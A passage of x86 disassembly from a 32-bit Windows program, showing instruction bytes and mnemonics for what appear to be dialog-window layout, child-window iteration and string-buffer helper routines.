  404642:	89 44 24 14          	mov    %eax,0x14(%esp)
  404646:	39 1d e4 14 43 00    	cmp    %ebx,0x4314e4
  40464c:	76 5b                	jbe    0x4046a9
  40464e:	be 44 10 43 00       	mov    $0x431044,%esi
  404653:	83 3e 00             	cmpl   $0x0,(%esi)
  404656:	76 45                	jbe    0x40469d
  404658:	50                   	push   %eax
  404659:	ff 76 04             	push   0x4(%esi)
  40465c:	8d 44 24 68          	lea    0x68(%esp),%eax
  404660:	50                   	push   %eax
  404661:	e8 6a 60 01 00       	call   0x41a6d0
  404666:	83 c4 0c             	add    $0xc,%esp
  404669:	85 c0                	test   %eax,%eax
  40466b:	75 2c                	jne    0x404699
  40466d:	68 00 04 00 00       	push   $0x400
  404672:	8d 84 24 54 01 00 00 	lea    0x154(%esp),%eax
  404679:	8b cd                	mov    %ebp,%ecx
  40467b:	50                   	push   %eax
  40467c:	ff 76 04             	push   0x4(%esi)
  40467f:	e8 99 f7 ff ff       	call   0x403e1d
  404684:	84 c0                	test   %al,%al
  404686:	74 11                	je     0x404699
  404688:	8d 84 24 50 01 00 00 	lea    0x150(%esp),%eax
  40468f:	50                   	push   %eax
  404690:	ff 36                	push   (%esi)
  404692:	57                   	push   %edi
  404693:	ff 15 90 1e 43 00    	call   *0x431e90
  404699:	8b 44 24 14          	mov    0x14(%esp),%eax
  40469d:	43                   	inc    %ebx
  40469e:	83 c6 0c             	add    $0xc,%esi
  4046a1:	3b 1d e4 14 43 00    	cmp    0x4314e4,%ebx
  4046a7:	72 aa                	jb     0x404653
  4046a9:	8d 44 24 14          	lea    0x14(%esp),%eax
  4046ad:	8b cd                	mov    %ebp,%ecx
  4046af:	50                   	push   %eax
  4046b0:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4046b4:	50                   	push   %eax
  4046b5:	ff b4 24 60 09 00 00 	push   0x960(%esp)
  4046bc:	e8 82 f5 ff ff       	call   0x403c43
  4046c1:	8a d8                	mov    %al,%bl
  4046c3:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4046c7:	50                   	push   %eax
  4046c8:	57                   	push   %edi
  4046c9:	88 5c 24 1b          	mov    %bl,0x1b(%esp)
  4046cd:	ff 15 84 1e 43 00    	call   *0x431e84
  4046d3:	8d 44 24 50          	lea    0x50(%esp),%eax
  4046d7:	50                   	push   %eax
  4046d8:	57                   	push   %edi
  4046d9:	ff 15 88 1e 43 00    	call   *0x431e88
  4046df:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  4046e3:	2b 4c 24 2c          	sub    0x2c(%esp),%ecx
  4046e7:	8b 74 24 38          	mov    0x38(%esp),%esi
  4046eb:	41                   	inc    %ecx
  4046ec:	2b 74 24 30          	sub    0x30(%esp),%esi
  4046f0:	8b d1                	mov    %ecx,%edx
  4046f2:	8b 44 24 58          	mov    0x58(%esp),%eax
  4046f6:	46                   	inc    %esi
  4046f7:	8b ee                	mov    %esi,%ebp
  4046f9:	c7 44 24 24 64 00 00 	movl   $0x64,0x24(%esp)
  404700:	00 
  404701:	2b 6c 24 5c          	sub    0x5c(%esp),%ebp
  404705:	2b d0                	sub    %eax,%edx
  404707:	89 54 24 28          	mov    %edx,0x28(%esp)
  40470b:	84 db                	test   %bl,%bl
  40470d:	0f 84 9b 00 00 00    	je     0x4047ae
  404713:	80 bc 24 5c 09 00 00 	cmpb   $0x0,0x95c(%esp)
  40471a:	00 
  40471b:	0f 85 cc 00 00 00    	jne    0x4047ed
  404721:	0f af 44 24 18       	imul   0x18(%esp),%eax
  404726:	6a 64                	push   $0x64
  404728:	5b                   	pop    %ebx
  404729:	99                   	cltd
  40472a:	f7 fb                	idiv   %ebx
  40472c:	8b d8                	mov    %eax,%ebx
  40472e:	8b 44 24 5c          	mov    0x5c(%esp),%eax
  404732:	0f af 44 24 14       	imul   0x14(%esp),%eax
  404737:	03 5c 24 28          	add    0x28(%esp),%ebx
  40473b:	2b cb                	sub    %ebx,%ecx
  40473d:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  404741:	99                   	cltd
  404742:	f7 7c 24 24          	idivl  0x24(%esp)
  404746:	03 c5                	add    %ebp,%eax
  404748:	89 44 24 20          	mov    %eax,0x20(%esp)
  40474c:	8b c1                	mov    %ecx,%eax
  40474e:	2b 74 24 20          	sub    0x20(%esp),%esi
  404752:	99                   	cltd
  404753:	2b c2                	sub    %edx,%eax
  404755:	8b d8                	mov    %eax,%ebx
  404757:	8b c6                	mov    %esi,%eax
  404759:	99                   	cltd
  40475a:	2b c2                	sub    %edx,%eax
  40475c:	d1 fb                	sar    $1,%ebx
  40475e:	8b f0                	mov    %eax,%esi
  404760:	d1 fe                	sar    $1,%esi
  404762:	03 74 24 30          	add    0x30(%esp),%esi
  404766:	03 5c 24 2c          	add    0x2c(%esp),%ebx
  40476a:	79 02                	jns    0x40476e
  40476c:	33 db                	xor    %ebx,%ebx
  40476e:	85 f6                	test   %esi,%esi
  404770:	79 02                	jns    0x404774
  404772:	33 f6                	xor    %esi,%esi
  404774:	6a f0                	push   $0xfffffff0
  404776:	57                   	push   %edi
  404777:	ff 15 80 1e 43 00    	call   *0x431e80
  40477d:	c1 e8 0a             	shr    $0xa,%eax
  404780:	f7 d0                	not    %eax
  404782:	83 e0 02             	and    $0x2,%eax
  404785:	0d 04 02 00 00       	or     $0x204,%eax
  40478a:	50                   	push   %eax
  40478b:	ff 74 24 24          	push   0x24(%esp)
  40478f:	ff 74 24 44          	push   0x44(%esp)
  404793:	56                   	push   %esi
  404794:	53                   	push   %ebx
  404795:	6a 00                	push   $0x0
  404797:	57                   	push   %edi
  404798:	ff 15 94 1e 43 00    	call   *0x431e94
  40479e:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4047a2:	50                   	push   %eax
  4047a3:	57                   	push   %edi
  4047a4:	ff 15 84 1e 43 00    	call   *0x431e84
  4047aa:	8a 5c 24 13          	mov    0x13(%esp),%bl
  4047ae:	80 bc 24 5c 09 00 00 	cmpb   $0x0,0x95c(%esp)
  4047b5:	00 
  4047b6:	75 35                	jne    0x4047ed
  4047b8:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4047bc:	8d 84 24 50 01 00 00 	lea    0x150(%esp),%eax
  4047c3:	68 00 04 00 00       	push   $0x400
  4047c8:	50                   	push   %eax
  4047c9:	68 38 74 42 00       	push   $0x427438
  4047ce:	ff b4 24 64 09 00 00 	push   0x964(%esp)
  4047d5:	e8 ec f4 ff ff       	call   0x403cc6
  4047da:	84 c0                	test   %al,%al
  4047dc:	74 0f                	je     0x4047ed
  4047de:	8d 84 24 50 01 00 00 	lea    0x150(%esp),%eax
  4047e5:	50                   	push   %eax
  4047e6:	57                   	push   %edi
  4047e7:	ff 15 9c 1e 43 00    	call   *0x431e9c
  4047ed:	6a 08                	push   $0x8
  4047ef:	ff 15 8c 1e 43 00    	call   *0x431e8c
  4047f5:	6a 05                	push   $0x5
  4047f7:	57                   	push   %edi
  4047f8:	2b e8                	sub    %eax,%ebp
  4047fa:	ff 15 74 1e 43 00    	call   *0x431e74
  404800:	8b f8                	mov    %eax,%edi
  404802:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  404806:	84 db                	test   %bl,%bl
  404808:	0f 84 a2 00 00 00    	je     0x4048b0
  40480e:	33 db                	xor    %ebx,%ebx
  404810:	e9 93 00 00 00       	jmp    0x4048a8
  404815:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  40481b:	0f 8d 8f 00 00 00    	jge    0x4048b0
  404821:	8d 44 24 40          	lea    0x40(%esp),%eax
  404825:	50                   	push   %eax
  404826:	57                   	push   %edi
  404827:	ff 15 84 1e 43 00    	call   *0x431e84
  40482d:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  404831:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  404835:	2b c1                	sub    %ecx,%eax
  404837:	40                   	inc    %eax
  404838:	2b cd                	sub    %ebp,%ecx
  40483a:	0f af 44 24 14       	imul   0x14(%esp),%eax
  40483f:	68 04 02 00 00       	push   $0x204
  404844:	6a 64                	push   $0x64
  404846:	5e                   	pop    %esi
  404847:	2b 4c 24 34          	sub    0x34(%esp),%ecx
  40484b:	99                   	cltd
  40484c:	f7 fe                	idiv   %esi
  40484e:	8b 74 24 44          	mov    0x44(%esp),%esi
  404852:	50                   	push   %eax
  404853:	8b 44 24 50          	mov    0x50(%esp),%eax
  404857:	2b c6                	sub    %esi,%eax
  404859:	0f af 4c 24 1c       	imul   0x1c(%esp),%ecx
  40485e:	40                   	inc    %eax
  40485f:	0f af 44 24 20       	imul   0x20(%esp),%eax
  404864:	99                   	cltd
  404865:	f7 7c 24 2c          	idivl  0x2c(%esp)
  404869:	50                   	push   %eax
  40486a:	6a 64                	push   $0x64
  40486c:	8b c1                	mov    %ecx,%eax
  40486e:	99                   	cltd
  40486f:	59                   	pop    %ecx
  404870:	f7 f9                	idiv   %ecx
  404872:	50                   	push   %eax
  404873:	8b 44 24 38          	mov    0x38(%esp),%eax
  404877:	99                   	cltd
  404878:	2b c2                	sub    %edx,%eax
  40487a:	d1 f8                	sar    $1,%eax
  40487c:	2b f0                	sub    %eax,%esi
  40487e:	2b 74 24 3c          	sub    0x3c(%esp),%esi
  404882:	0f af 74 24 28       	imul   0x28(%esp),%esi
  404887:	8b c6                	mov    %esi,%eax
  404889:	99                   	cltd
  40488a:	f7 f9                	idiv   %ecx
  40488c:	50                   	push   %eax
  40488d:	6a 00                	push   $0x0
  40488f:	57                   	push   %edi
  404890:	ff 15 94 1e 43 00    	call   *0x431e94
  404896:	6a 02                	push   $0x2
  404898:	57                   	push   %edi
  404899:	ff 15 74 1e 43 00    	call   *0x431e74
  40489f:	8b f8                	mov    %eax,%edi
  4048a1:	3b 7c 24 1c          	cmp    0x1c(%esp),%edi
  4048a5:	74 09                	je     0x4048b0
  4048a7:	43                   	inc    %ebx
  4048a8:	85 ff                	test   %edi,%edi
  4048aa:	0f 85 65 ff ff ff    	jne    0x404815
  4048b0:	5f                   	pop    %edi
  4048b1:	5e                   	pop    %esi
  4048b2:	5d                   	pop    %ebp
  4048b3:	5b                   	pop    %ebx
  4048b4:	81 c4 40 09 00 00    	add    $0x940,%esp
  4048ba:	c2 0c 00             	ret    $0xc
  4048bd:	8d 44 24 10          	lea    0x10(%esp),%eax
  4048c1:	50                   	push   %eax
  4048c2:	ff 74 24 10          	push   0x10(%esp)
  4048c6:	ff 74 24 10          	push   0x10(%esp)
  4048ca:	ff 74 24 10          	push   0x10(%esp)
  4048ce:	e8 04 00 00 00       	call   0x4048d7
  4048d3:	83 c4 10             	add    $0x10,%esp
  4048d6:	c3                   	ret
  4048d7:	ff 74 24 10          	push   0x10(%esp)
  4048db:	6a 00                	push   $0x0
  4048dd:	ff 74 24 14          	push   0x14(%esp)
  4048e1:	ff 74 24 14          	push   0x14(%esp)
  4048e5:	ff 74 24 14          	push   0x14(%esp)
  4048e9:	e8 04 00 00 00       	call   0x4048f2
  4048ee:	83 c4 14             	add    $0x14,%esp
  4048f1:	c3                   	ret
  4048f2:	55                   	push   %ebp
  4048f3:	8b ec                	mov    %esp,%ebp
  4048f5:	ff 75 18             	push   0x18(%ebp)
  4048f8:	ff 75 14             	push   0x14(%ebp)
  4048fb:	ff 75 10             	push   0x10(%ebp)
  4048fe:	ff 75 0c             	push   0xc(%ebp)
  404901:	ff 75 08             	push   0x8(%ebp)
  404904:	e8 27 d1 ff ff       	call   0x401a30
  404909:	8b 08                	mov    (%eax),%ecx
  40490b:	ff 70 04             	push   0x4(%eax)
  40490e:	83 c9 01             	or     $0x1,%ecx
  404911:	51                   	push   %ecx
  404912:	e8 d6 55 01 00       	call   0x419eed
  404917:	83 c4 1c             	add    $0x1c,%esp
  40491a:	85 c0                	test   %eax,%eax
  40491c:	79 03                	jns    0x404921
  40491e:	83 c8 ff             	or     $0xffffffff,%eax
  404921:	5d                   	pop    %ebp
  404922:	c3                   	ret
  404923:	a1 18 7f 43 00       	mov    0x437f18,%eax
  404928:	40                   	inc    %eax
  404929:	83 f8 08             	cmp    $0x8,%eax
  40492c:	68 00 04 00 00       	push   $0x400
  404931:	1b c9                	sbb    %ecx,%ecx
  404933:	23 c8                	and    %eax,%ecx
  404935:	89 0d 18 7f 43 00    	mov    %ecx,0x437f18
  40493b:	c1 e1 0b             	shl    $0xb,%ecx
  40493e:	81 c1 18 3f 43 00    	add    $0x433f18,%ecx
  404944:	51                   	push   %ecx
  404945:	ff 74 24 0c          	push   0xc(%esp)
  404949:	e8 03 00 00 00       	call   0x404951
  40494e:	c2 04 00             	ret    $0x4
  404951:	55                   	push   %ebp
  404952:	8b ec                	mov    %esp,%ebp
  404954:	56                   	push   %esi
  404955:	8b 75 0c             	mov    0xc(%ebp),%esi
  404958:	33 c0                	xor    %eax,%eax
  40495a:	50                   	push   %eax
  40495b:	50                   	push   %eax
  40495c:	ff 75 10             	push   0x10(%ebp)
  40495f:	b9 e8 0c 45 00       	mov    $0x450ce8,%ecx
  404964:	66 89 06             	mov    %ax,(%esi)
  404967:	56                   	push   %esi
  404968:	ff 75 08             	push   0x8(%ebp)
  40496b:	e8 6f f4 ff ff       	call   0x403ddf
  404970:	84 c0                	test   %al,%al
  404972:	75 2a                	jne    0x40499e
  404974:	ff 75 10             	push   0x10(%ebp)
  404977:	56                   	push   %esi
  404978:	ff 75 08             	push   0x8(%ebp)
  40497b:	ff 35 9c cb 44 00    	push   0x44cb9c
  404981:	ff 15 70 1e 43 00    	call   *0x431e70
  404987:	85 c0                	test   %eax,%eax
  404989:	75 13                	jne    0x40499e
  40498b:	ff 75 10             	push   0x10(%ebp)
  40498e:	56                   	push   %esi
  40498f:	ff 75 08             	push   0x8(%ebp)
  404992:	ff 35 a0 cb 44 00    	push   0x44cba0
  404998:	ff 15 70 1e 43 00    	call   *0x431e70
  40499e:	8b c6                	mov    %esi,%eax
  4049a0:	5e                   	pop    %esi
  4049a1:	5d                   	pop    %ebp
  4049a2:	c2 0c 00             	ret    $0xc
  4049a5:	80 3d 20 7f 43 00 00 	cmpb   $0x0,0x437f20
  4049ac:	56                   	push   %esi
  4049ad:	8b f1                	mov    %ecx,%esi
  4049af:	75 05                	jne    0x4049b6
  4049b1:	e8 08 00 00 00       	call   0x4049be
  4049b6:	c6 46 01 01          	movb   $0x1,0x1(%esi)
  4049ba:	8b c6                	mov    %esi,%eax
  4049bc:	5e                   	pop    %esi
  4049bd:	c3                   	ret
  4049be:	55                   	push   %ebp
  4049bf:	8b ec                	mov    %esp,%ebp
  4049c1:	81 ec 04 03 00 00    	sub    $0x304,%esp
  4049c7:	33 c0                	xor    %eax,%eax
  4049c9:	53                   	push   %ebx
  4049ca:	33 db                	xor    %ebx,%ebx
  4049cc:	43                   	inc    %ebx
  4049cd:	56                   	push   %esi
  4049ce:	8b d3                	mov    %ebx,%edx
  4049d0:	be 1b 01 00 00       	mov    $0x11b,%esi
